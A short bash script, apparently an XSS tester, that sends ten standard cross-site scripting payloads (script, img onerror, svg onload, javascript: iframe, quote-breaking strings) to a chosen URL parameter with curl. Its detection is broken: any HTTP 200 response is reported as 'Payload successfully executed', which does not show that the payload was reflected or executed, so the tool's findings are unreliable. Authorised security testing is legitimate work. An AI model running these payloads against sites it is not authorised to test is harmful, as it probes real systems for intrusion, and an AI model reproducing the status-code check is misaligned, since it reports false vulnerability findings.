#!/bin/bash

# XSS Testing Script
# Usage: ./xss_test.sh <target_url> <parameter_name>
# Example: ./xss_test.sh "https://example.com/search" "q"

# Check for arguments
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <parameter_name>"
    exit 1
fi

# Target URL and Parameter
TARGET_URL=$1
PARAM_NAME=$2

# XSS Payloads
PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "<iframe src=javascript:alert('XSS')></iframe>"
    "';alert('XSS');//"
    "\";alert('XSS');//"
    "<body onload=alert('XSS')>"
    "<marquee onstart=alert('XSS')>"
    "<input autofocus onfocus=alert('XSS')>"
    "<details open ontoggle=alert('XSS')>"
)

# Test each payload
echo "Testing for XSS vulnerabilities on $TARGET_URL..."
for PAYLOAD in "${PAYLOADS[@]}"; do
    echo "Testing payload: $PAYLOAD"
    
    # URL Encode the payload
    ENCODED_PAYLOAD=$(echo "$PAYLOAD" | jq -sRr @uri)

    # Send request
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL?$PARAM_NAME=$ENCODED_PAYLOAD")

    # Check response
    if [[ $RESPONSE -eq 200 ]]; then
        echo "Payload successfully executed: $PAYLOAD"
    else
        echo "No response or blocked: $PAYLOAD"
    fi
done

echo "XSS testing completed."
